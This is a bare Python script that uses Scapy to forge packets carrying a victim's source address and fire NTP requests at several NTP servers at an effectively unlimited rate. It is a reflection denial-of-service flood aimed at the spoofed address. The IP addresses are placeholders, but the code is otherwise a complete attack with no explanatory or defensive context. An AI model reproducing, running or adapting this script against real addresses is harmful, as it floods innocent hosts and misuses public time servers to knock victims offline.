from scapy.all import *


ntp_servers = ["D.E.F.G", "H.I.K.L", "M.N.O.P"]
src_ip = 'A.B.C.D'
src_port = RandShort()
ip = IP(src=src_ip, dst=ntp_servers)
udp = UDP(sport=src_port, dport=123)
data = "\x1b"+"\x00"*47
pkt = Ether() / ip / udp / data
sendpfast(pkt, pps=999999999999999, loop=999999999999999)
